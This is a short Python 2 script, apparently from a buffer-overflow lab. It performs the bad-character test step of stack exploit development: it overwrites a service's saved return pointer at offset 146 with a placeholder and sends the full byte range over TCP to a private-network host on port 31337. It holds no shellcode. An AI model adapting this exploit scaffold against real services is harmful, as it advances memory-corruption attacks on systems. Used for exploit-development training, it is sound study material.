#!/usr/bin/env python2
import socket

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146
badchar_test = ""		# start with an empty string
badchars = [0x00, 0x0A]	# we've reasoned that these are definitely bad

# generate the sting
for i in range(0x00, 0xFF + 1):		# range(0x00, 0xFF) only returns up to 0xFE
  if i not in badchars:				# skip the badchars
    badchar_test += chr(i)			# append each non-badchar char to the string

# open a file for writing ("w") the string as a binary ("b") data
with open("badchar_test.bin", "wb") as f:
  f.write(badchar_test)

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += "BBBB"							# SRP overwrite
buf += badchar_test						# ESP points here
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
